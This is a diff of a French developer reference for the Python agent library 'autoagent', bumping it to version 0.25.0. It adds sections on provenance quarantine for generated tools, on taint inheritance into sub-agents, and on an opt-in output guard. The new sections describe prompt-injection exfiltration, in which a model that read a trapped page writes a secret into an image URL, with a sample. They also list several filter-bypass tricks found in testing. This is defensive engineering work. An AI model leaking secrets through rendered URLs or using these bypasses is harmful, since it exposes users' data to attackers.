@@ -3,7 +3,7 @@
 > Référence technique complète pour intégrer, étendre et tester `autoagent` dans un projet Python.
 > **Public visé** : devs qui vont écrire des tools, brancher l'agent sur leur app, ou éventuellement contribuer à la lib.
 
-**Auteur** : Mohamed LAAZIZI · **Équipe** : Alyce R&D · **Version** : 2026-10-04 · **Couvre autoagent** : 0.24.0 (publié sur PyPI : [`autoagent-core`](https://pypi.org/project/autoagent-core/))
+**Auteur** : Mohamed LAAZIZI · **Équipe** : Alyce R&D · **Version** : 2026-11-11 · **Couvre autoagent** : 0.25.0 (publié sur PyPI : [`autoagent-core`](https://pypi.org/project/autoagent-core/))
 
 ---
 
@@ -61,9 +61,11 @@
 40. [Le journal durable — une coupure brutale ne refait jamais un effet](#40-le-journal-durable--une-coupure-brutale-ne-refait-jamais-un-effet) *(0.23.0)*
 41. [0.23.1 — correctifs : des défauts reproduits, un bac à sable qui dit ce qu'il garantit](#41-0231--correctifs--des-défauts-reproduits-un-bac-à-sable-qui-dit-ce-quil-garantit) *(0.23.1)*
 42. [0.24.0 — se mesurer : un banc d'injection, un banc de pannes, un juge audité, des durées](#42-0240--se-mesurer--un-banc-dinjection-un-banc-de-pannes-un-juge-audité-des-durées) *(0.24.0)*
-43. [Le code comme action en une ligne — `enable_code_action()`](#43-le-code-comme-action-en-une-ligne--enable_code_action) *(non publiée)*
-44. [La voix en continu — Gemini Live sous la boucle](#44-la-voix-en-continu--gemini-live-sous-la-boucle) *(non publiée)*
-45. [Le confinement par le noyau — une frontière sans Docker](#45-le-confinement-par-le-noyau--une-frontière-sans-docker) *(non publiée)*
+43. [Le code comme action en une ligne — `enable_code_action()`](#43-le-code-comme-action-en-une-ligne--enable_code_action) *(0.25.0)*
+44. [La voix en continu — Gemini Live sous la boucle](#44-la-voix-en-continu--gemini-live-sous-la-boucle) *(0.25.0)*
+45. [Le confinement par le noyau — une frontière sans Docker](#45-le-confinement-par-le-noyau--une-frontière-sans-docker) *(0.25.0)*
+46. [Provenance des outils générés, et la teinte qui descend dans les sous-agents](#46-provenance-des-outils-générés-et-la-teinte-qui-descend-dans-les-sous-agents) *(0.25.0)*
+47. [La garde du canal de la réponse — `output_guard`](#47-la-garde-du-canal-de-la-réponse--output_guard) *(0.25.0)*
 
 ---
 
@@ -130,7 +132,7 @@
 - Une clé API d'un provider LLM (OpenAI, Anthropic, DeepSeek, Gemini)
 - **Docker** — *optionnel mais recommandé* : il fournit la vraie isolation OS des tools dynamiques
   (`DockerSandbox`, §11.4). Sans démon Docker, `make_sandbox()` retombe automatiquement sur
-  `SubprocessSandbox` (durcissement AST seul, pas d'isolation réseau) — ou, sur `main` (non publié), sur
+  `SubprocessSandbox` (durcissement AST seul, pas d'isolation réseau) — ou, depuis la 0.25.0, sur
   le sous-processus CONFINÉ par le noyau là où Linux le permet (§45). Pas besoin de Docker si tu
   n'utilises pas les tools dynamiques.
 
@@ -192,7 +194,7 @@ python examples_autoagent/17_memoire_factuelle.py
 
 Et le **constructeur visuel** (`constructeur_autoagent.html`, hors-ligne) :
 assemble des blocs → code Python généré ; menu « Charger un exemple » =
-32 presets (tous générés et compilés en CI) + les démos complètes en lecture.
+33 presets (tous générés et compilés en CI) + les démos complètes en lecture.
 
 ---
 
@@ -1611,7 +1613,7 @@ reach Docker, which can enable code execution through arbitrary C function calls
   Linux) n'est joignable : fail-closed, rien ne s'exécute. `require_docker=True` avec
   `prefer_docker=False` est contradictoire (`ValueError`) ;
 - `prefer_docker=False` choisit le sous-processus **en connaissance de cause** : aucun avertissement ;
-- *(sur `main`, non publié — §45)* entre Docker et le sous-processus simple, `make_sandbox()` essaie le
+- *(0.25.0 — §45)* entre Docker et le sous-processus simple, `make_sandbox()` essaie le
   sous-processus **confiné par le noyau** (Linux x86_64) : une frontière, donc pas d'avertissement.
   **`make_sandbox(require_boundary=True)`** accepte Docker ou ce bac confiné et refuse le sous-processus
   simple (`ToolError`).
@@ -1634,7 +1636,7 @@ DockerSandbox().isolation()
 ```
 
 `os_boundary` est vrai pour Docker, et pour un sous-processus confiné par le noyau
-(`SubprocessSandbox(confine=Confinement())`, sur `main`, non publié — §45 ; son `kind` est
+(`SubprocessSandbox(confine=Confinement())`, 0.25.0 — §45 ; son `kind` est
 `"subprocess+confine"`). `limits` ne liste que les plafonds RÉELS (le délai mur,
 plus ceux de `SandboxLimits` s'ils sont posés). `network_isolated` pour Docker : le réseau est
 coupé tant que l'outil n'a pas la permission `network`.
@@ -2207,7 +2209,7 @@ Passe un `post_turn_hook` (§4.7) qui regarde `ctx.tool_calls` et retourne un `M
 
 ### Annexe A — Liste des fichiers de la lib
 
-*(vérifiée contre le disque sur `main` après la 0.24.0 — `autoagent/` : 34 modules + `__init__.py` ; `providers/` : 6 modules + `__init__.py`)*
+*(vérifiée contre le disque sur `main` à la 0.25.0 — `autoagent/` : 35 modules + `__init__.py` ; `providers/` : 6 modules + `__init__.py`)*
 
 ```
 autoagent/
@@ -2227,7 +2229,7 @@ autoagent/
 │                            # PythonRunner (§11.7, §11.9)
 ├── sandbox.py               # SubprocessSandbox (+ warm 0.22.0, + limits=SandboxLimits 0.23.1), DockerSandbox,
 │                            # make_sandbox(require_docker=), isolation() — 0.23.1 — pont host-function ;
-│                            # main (non publié) — confine=Confinement : Landlock + seccomp, Linux x86_64 (§45)
+│                            # 0.25.0 — confine=Confinement : Landlock + seccomp, Linux x86_64 (§45)
 ├── approval.py              # ToolManifest (allowlist par hash) + promotion humaine + CLI
 ├── orchestrator.py          # 0.9.0 — Orchestrator, Step, TurnEvent (flux piloté par l'hôte, §15)
 ├── http.py                  # post_json / post_sse (urllib + retry/backoff + jitter, Retry-After ms/s/date — 0.23.1) ;
@@ -2264,7 +2266,8 @@ autoagent/
 ├── redteam.py               # 0.24.0 — banc d'injection à canari : run_injection_bench, positive_control,
 │                            # DocileProvider, injection_variant / injection_tasks (§42.1)
 ├── faults.py                # 0.24.0 — banc de pannes : FaultServer (vrai serveur HTTP local) + run_fault_bench (§42.2)
-├── ws.py                    # main (non publié) — client WebSocket synchrone RFC 6455, stdlib seule (§44)
+├── ws.py                    # 0.25.0 — client WebSocket synchrone RFC 6455, stdlib seule (§44)
+├── output_guard.py          # 0.25.0 — OutputGuard / guard_output : la garde du canal de la réponse (§47)
 └── providers/
     ├── __init__.py          # create_provider (fabrique par nom)
     ├── base.py              # LLMProvider (ABC) + deep-merge de config.extra_body ;
@@ -2274,7 +2277,7 @@ autoagent/
     ├── anthropic.py         # blocs image, tool_choice, JSON best-effort
     ├── gemini.py            # inline_data, thought_signature (Gemini 3),
     │                        # functionResponse groupées sous role "user" (0.18)
-    ├── gemini_live.py       # main (non publié) — GeminiLiveProvider : la voix en continu sous la boucle (§44)
+    ├── gemini_live.py       # 0.25.0 — GeminiLiveProvider : la voix en continu sous la boucle (§44)
     └── routing.py           # RoutingProvider (dispatch par requête : texte → cheap, image → vision)
 ```
 
@@ -2335,7 +2338,7 @@ from autoagent import (
 
     # Providers (instances directes si besoin)
     AnthropicProvider, DeepSeekProvider, GeminiProvider, OpenAIProvider, LLMProvider,
-    GeminiLiveProvider,         # main (non publié) — la voix en continu (§44)
+    GeminiLiveProvider,         # 0.25.0 — la voix en continu (§44)
 
     # 0.16.0 — record / replay
     RecordSession, RecordingProvider, RecordingRegistry,
@@ -2359,14 +2362,16 @@ from autoagent.trace import truncate_preview        # helper public pour preview
 from autoagent.eval import run_k, ReliabilityReport  # 0.18.0 — fiabilité pass^k (§25.4)
 from autoagent.compare import detectable_difference, paired_interval, paired_p_value, wilson_interval  # §38
 from autoagent.sandbox import SandboxLimits, make_sandbox   # 0.23.1 — plafonds du sous-processus, repli refusable (§11.4)
-from autoagent.sandbox import Confinement                    # main (non publié) — confinement par le noyau (§45)
+from autoagent.sandbox import Confinement                    # 0.25.0 — confinement par le noyau (§45)
 from autoagent.http import is_retryable_status               # 0.23.1 — quels statuts HTTP sont relancés (§41.2)
 from autoagent.judge import audit_check, result_from, trivial_negatives     # 0.24.0 — auditer un juge (§42.4)
 from autoagent.redteam import (                              # 0.24.0 — le banc d'injection à canari (§42.1)
     DocileProvider, positive_control, run_injection_bench, standard_agent, injection_variant, injection_tasks, ATTACKS,
 )
 from autoagent.faults import FaultServer, run_fault_bench, FAULT_CASES      # 0.24.0 — le banc de pannes (§42.2)
-from autoagent.ws import WebSocketClient, WebSocketClosed, WebSocketError   # main (non publié) — WebSocket stdlib (§44)
+from autoagent.ws import WebSocketClient, WebSocketClosed, WebSocketError   # 0.25.0 — WebSocket stdlib (§44)
+from autoagent.output_guard import OutputGuard, guard_output                # 0.25.0 — garde du canal de la réponse (§47)
+from autoagent.gate import delegation_taint                                 # 0.25.0 — la teinte qui descend (§46)
 ```
 
 ### Annexe C — Cheat-sheet
@@ -5019,7 +5024,7 @@ l'attaque a échoué ; `metric="utility"` : réussi = la tâche légitime a abou
   DÉTERMINISTE, les 3 répétitions d'une attaque sont identiques : ce p minuscule est mécanique, la lecture utile est
   « 8 tâches sur 8 ».
 - **`image_markdown` aboutit dans les trois** : l'ordre d'écrire le code dans l'URL d'une image rendue passe
-  par la **réponse**, canal que seule `Agent(output_guard="neutralize")` (opt-in, `output_guard.py`, [Unreleased] : `image_markdown` 1/1 → 0/1 au niveau 1) regarde. À couvrir côté hôte (filtre de
+  par la **réponse**, canal que seule `Agent(output_guard="neutralize")` (opt-in, `output_guard.py`, 0.25.0, §47 : `image_markdown` 1/1 → 0/1 au niveau 1) regarde. À couvrir côté hôte (filtre de
   sortie, rendu d'images désactivé).
 
 **Niveau 2, mesuré (démo 38 `--reel`, `deepseek-chat`, k=3 → 24 runs par configuration, 4 octobre 2026 — un modèle,
@@ -5371,9 +5376,24 @@ confiné par le noyau là où Linux le permet (§45), et dans le `SubprocessSand
 d'interdits, pas une frontière : en production, `sandbox=DockerSandbox(...)` et `tool_policy`. Pas encore dans le
 constructeur visuel.
 
+**`enable_code_action(compact=True)`** *(0.25.0, opt-in)* : une description de `run_python` et une consigne réduites
+de moitié, pour baisser le coût fixe d'entrée à chaque étape. Mesuré (`deepseek-chat`, k=3, `compare_configs`, contre
+`enable_code_action()`) : sur les **petites tâches** qu'il vise, **−15 % de jetons** [−20 % ; −10 %] ; le « −29 % »
+toutes familles confondues vient surtout des gros résultats (77 % de l'écart) et n'est pas le bon chiffre. Contre
+« sans code », les petites tâches coûtent encore +28 % [+23 % ; +33 %] (extraction +59 %). Jetons bruts : la part
+servie par le cache n'était pas gardée, aucun gain de COÛT n'est donc annoncé. Un modèle, réussite 100 % des deux
+côtés : le défaut ne change pas. La consigne doit garder ses trois idées (gros résultat / pas soi-même /
+`call_host`) : une première formulation plus faible faisait lire au modèle les gros résultats lui-même.
+
+**La part du cache dans `compare_configs`** *(0.25.0)* : `CostComparison.cached_share_a` / `cached_share_b` (dans
+`summary()` et `to_dict()`) = jetons d'entrée servis par le cache / jetons d'entrée, sur toutes les tentatives d'un
+bras ; `None` dès qu'une tentative ne les rapporte pas (jamais un zéro inventé). Des jetons en moins ne valent pas le
+même pourcentage de coût quand cette part bouge : celle de DeepSeek a varié de 38 % à 79 % selon la configuration du
+même banc. Le banc d'efficacité la garde aussi (`part_cache`, `entree` / `cache` par famille).
+
 ## 44. La voix en continu — Gemini Live sous la boucle
 
-*(sur `main`, non publiée)* Une conversation vocale n'est pas une suite de requêtes : le micro envoie en continu,
+*(0.25.0)* Une conversation vocale n'est pas une suite de requêtes : le micro envoie en continu,
 le modèle répond quand il a fini d'écouter, et il peut demander un outil en pleine phrase. Jusqu'ici une boucle
 vocale tournait HORS de la bibliothèque (le superviseur du README la regarde de côté) — et ses appels d'outils
 échappaient donc à `tool_policy`, aux gardes, au journal. `GeminiLiveProvider` met la voix SOUS la boucle.
@@ -5452,7 +5472,7 @@ pas encore de démo numérotée ni d'entrée dans le constructeur visuel.
 
 ## 45. Le confinement par le noyau — une frontière sans Docker
 
-*(sur `main`, non publiée)* Le modèle écrit de plus en plus de code (`run_python`, `enable_code_action()`, les
+*(0.25.0)* Le modèle écrit de plus en plus de code (`run_python`, `enable_code_action()`, les
 outils générés), et ce code tourne dans un `SubprocessSandbox` que retient une liste d'interdits sur la syntaxe —
 contournable, la bibliothèque le dit depuis la 0.22.0. Une fois contournée, le code a les droits du processus
 hôte. `DockerSandbox` est la réponse là où Docker existe ; il n'existe pas partout (un serveur sans démon, une prod
@@ -5572,6 +5592,133 @@ Le
 confinement automatique ne nomme aucun dossier : un outil qui a besoin de fichiers demande un `Confinement(read=,
 write=)` écrit par l'hôte. Pas de dossier temporaire privé comme le `/tmp` du conteneur. Pas encore de démo
 numérotée ni d'entrée dans le constructeur visuel.
+
+---
+
+## 46. Provenance des outils générés, et la teinte qui descend dans les sous-agents
+
+*(0.25.0)* Un agent qui écrit ses outils en imitant sa bibliothèque recopie les outils piégés, et
+supprimer l'original ne supprime pas les copies (EvoMal, arXiv 2608.25776 ; l'outil d'analyse Bandit y passe
+de 85 % à 7 % de détection après réécriture d'une ligne). D'où la règle : on ne juge pas un outil généré
+sur son contenu, on le juge sur sa **provenance** — le run qui l'a fait écrire avait-il lu du contenu non fiable ?
+
+### 46.1 La quarantaine (`DynamicToolBuilder(persist=True)`)
+
+```python
+builder = DynamicToolBuilder(provider, tools_dir="outils", persist=True)
+agent.enable_dynamic_tools(builder)
+agent.run("lis cette page puis fabrique l'outil qu'elle décrit")   # lire_page(untrusted=True) teinte le run
+
+builder.quarantined()                     # ['outil_de_la_page'] — gardé, inspectable, jamais rechargé
+builder.catalogue()["outil_de_la_page"]["provenance"]
+# {'tainted': True, 'context': 'run', 'seq': 3, 'visible_tools': ['autre_outil']}
+builder.release("outil_de_la_page", reviewed_sha256="…")   # validation HUMAINE, par empreinte exacte
+builder.descendants("outil_de_la_page")    # ce qui a été construit après lui, en le voyant (transitif)
+builder.quarantine("outil_suspect", cascade=True)          # lui ET ses descendants
+```
+
+- Chaque entrée du catalogue porte `provenance` : teinte du run à la construction (lue sur la porte active,
+  §39 ; illisible = teinté, fail-closed), outils de la bibliothèque visibles, numéro d'ordre.
+- Un outil construit dans un run teinté est en **quarantaine** : `load_library()` ne le recharge pas,
+  `release(name, reviewed_sha256)` le libère seulement si l'empreinte donnée est celle du fichier relu ET de la
+  construction.
+- **À l'appel** : un outil en quarantaine n'est appelable que DANS le run qui l'a construit (le modèle l'a écrit
+  pour sa tâche en cours). Au run suivant du même agent, par un autre agent, par l'hôte hors run, ou après une
+  quarantaine posée par l'hôte : refusé (`GeneratedPythonTool.admission`, fail-closed ; la quarantaine survit à un
+  catalogue perdu).
+- **`approval.load_tools`** consulte le catalogue d'un dossier tenu par le constructeur : un outil non approuvé
+  n'est enregistré que si le catalogue le connaît, sans quarantaine ni retrait, empreinte inchangée — sinon il est
+  rapporté `"quarantined"` / `"retired"`. Catalogue illisible : rien de non approuvé, fichier intact. Une
+  approbation par manifeste (empreinte exacte, §11) reste prioritaire. Un dossier sans catalogue ne change pas.
+- Un catalogue d'avant la 0.25.0 n'a pas de provenance : ses outils se rechargent comme avant.
+
+### 46.2 La teinte descend dans les sous-agents (`as_tool`, `delegate_to`) — changement de défaut
+
+Avant la 0.25.0, un agent qui avait lu une page non fiable se voyait refuser un envoi (`egress`, garde trifecta),
+mais le même envoi, **demandé à un sous-agent**, partait : le sous-agent naissait « propre », il ne voyait que la
+demande, pas la page. Seul `inherit_policy=True`, à penser à chaque délégation, fermait ce chemin. La même faille
+blanchissait la provenance : un outil fait construire par un sous-agent était enregistré `tainted: False`.
+
+Désormais, **le run d'un sous-agent appelé par un run teinté naît teinté**, avec ou sans `inherit_policy`, de façon
+transitive (une chaîne de délégations) et pour `delegate_to` en parallèle :
+
+| Dans le sous-agent | Effet |
+|---|---|
+| garde trifecta | ses outils `egress=True` sont refusés (`"deny"`) ; `"approve"` met son run en pause, ce qu'une délégation ne peut pas attendre : l'envoi ne part pas, le parent reçoit une erreur d'outil et continue |
+| `tool_policy` | `ctx.tainted` vaut `True` |
+| outils qu'il fait construire | quarantaine, `provenance.context == "delegated_from_tainted_run"` |
+| `ActionGate.lineage_tainted` | `True` : dit POURQUOI le run est teinté |
+
+L'héritage ne dure que la délégation : appelé ensuite seul par un run propre, le sous-agent est propre (sa mémoire
+décide de sa teinte d'après son transcript, pas d'après ce drapeau). Un hôte qui veut qu'un sous-agent précis
+envoie malgré tout le dit **sur cet agent** : `trifecta_guard="off"`, en connaissance de cause.
+
+**Ce que ça casse, mesuré sur un consommateur.** Rien qui n'envoie pas : la garde trifecta ne vise que les outils
+`egress=True`, et une `tool_policy` qui lit `ctx.tainted` ne voit une différence que pour les outils qu'elle
+conditionne à la teinte. Vérifié par lecture sur la Fabrique de SaaS (autosas, copie 0.21.0) : aucun outil `egress`,
+et la politique ne conditionne à la teinte que des écritures de code qu'aucun de ses trois sous-agents ne possède.
+
+**Vérifié** : `tests/test_delegation_teinte.py` (10 tests ; 7 échouent sans la ligne qui sème la teinte),
+`tests/test_dynamic_provenance.py` et `tests/test_dynamic_provenance_contournements.py`. Les trois contournements de
+la quarantaine (délégation, appel au run suivant, `approval.load_tools`) ont été trouvés par une passe adverse,
+reproduits, puis fermés. **Pas vérifié** : un vrai modèle ; la reprise d'un checkpoint au milieu d'une délégation ;
+`Orchestrator`. Hors contrat (écrit) : un historique RÉSUMÉ par l'hôte sans cadre `UNTRUSTED` n'est pas teinté ;
+`builder.build()` appelé par l'hôte hors de tout run est propre.
+
+---
+
+## 47. La garde du canal de la réponse — `output_guard`
+
+*(0.25.0, opt-in)* Les gardes de la bibliothèque regardent les APPELS d'outil. Aucune ne lisait la réponse finale :
+un modèle qui a lu une page piégée peut écrire le secret dans l'URL d'une image de sa réponse
+(`![logo](https://hôte/p.png?d=SECRET)`), et l'interface qui l'affiche part chercher l'image sans un clic. Le banc
+d'injection (§42.1, attaque `image_markdown`) le mesurait : 1 compromis sur 1 dans les trois configurations de la
+démo 38.
+
+```python
+from autoagent import Agent
+from autoagent.output_guard import OutputGuard
+
+agent = Agent(provider, output_guard="neutralize")             # défaut : "off"
+agent = Agent(provider, output_guard=OutputGuard(allowed_hosts=("cdn.alyce.fr",), links_from_untrusted=False))
+```
+
+**La règle**, dans un run TEINTÉ seulement (un run sain n'est jamais touché) : toute URL de la réponse doit se
+retrouver dans le transcript, sinon elle est retirée (`[image retirée]`, `[lien retiré]`).
+
+- Une **image** (chargée sans clic) n'est gardée que si son URL est dans un contenu FIABLE (prompt système,
+  message de l'utilisateur, résultat d'un outil non `untrusted`) ou si son hôte est dans `allowed_hosts`.
+- Un **lien** ou une URL nue (il faut un clic) est gardé aussi s'il est cité depuis le contenu non fiable (une
+  source) ; `links_from_untrusted=False` le refuse.
+- Une URL construite par le modèle (secret collé dans la requête ou le chemin, encodé, découpé) n'est jamais
+  dans le transcript : elle part.
+- Une URL fiable est aussi reconnue sous une forme **normalisée** : entités (`&amp;`), casse de l'hôte et du
+  schéma, http/https, port par défaut, `/` final, `mailto:` réduit à l'adresse. Jamais en changeant le chemin, la
+  requête, le fragment ou en acceptant `user@`.
+
+**Formes couvertes** : image et lien en ligne, références (destination sur la même ligne ou la suivante), liens
+automatiques, balises HTML (`src`, `href`, `srcset`, `data`, `action`, `poster`…, `<img/src=…>`), URL nues,
+schéma en majuscules, `\/` échappé, barres inverses lues comme `/` par le navigateur (`/\hôte`, `\\hôte`,
+tabulation dans l'URL), entités numériques avec ou sans point-virgule, tout schéma (`javascript:`, `mailto:`).
+
+**Contrats.** Fail-closed : une garde qui plante vide la réponse ; une valeur inconnue d'`output_guard` lève à la
+construction. Observabilité fail-open : l'événement `output_guard_block` (ou `output_guard_would_block` sous
+`shadow_guards`) donne le genre, la longueur et une empreinte de chaque URL retirée — **jamais l'URL**. Le flux de
+texte est retenu quand la garde est active sur un run déjà teinté. Toutes les expressions régulières sont en temps
+linéaire : une réponse du modèle ne peut pas bloquer le run.
+
+**Mesuré.** Banc d'injection niveau 1 (hors ligne, modèle docile) : `image_markdown` 1/1 → **0/1** dans les trois
+configurations, utilité inchangée (8/8). Une passe adverse (Chrome sans tête + serveur local qui journalise les
+requêtes) a trouvé six contournements — entité sans point-virgule, barres inverses, destination à la ligne, une
+expression cubique (`<a` + 800 espaces : 0,64 s), un balayage quadratique (6 000 définitions : 8 s) — et 6 faux
+positifs sur 12 réponses légitimes : tous fermés, chacun avec un test (`tests/test_output_guard_contournements.py`).
+Rejoué : 51 formes tiennent ; les 2 qui restent sont des LIENS cités depuis la page, voulus.
+
+**Ce que ça ne couvre pas.** Un secret écrit en clair dans le texte (l'utilisateur en est le lecteur légitime) ; une
+sélection parmi des URL préparées par l'attaquant et présentes dans la page (quelques bits par choix ;
+`links_from_untrusted=False` le ferme) ; une URL de LECTURE (`lire_page(url)` est un appel d'outil) ; la voix ; un
+`>` dans une valeur d'attribut entre guillemets coupe la balise (le reste passe par le filet des URL nues). **Pas
+mesuré** : le taux de faux positifs sur les réponses d'un vrai modèle — c'est pourquoi la garde reste opt-in.
 
 ---
 *Doc maintenue par l'équipe Alyce R&D. Pour questions, ouvrir une issue sur le repo interne ou taper l'auteur sur Slack.*
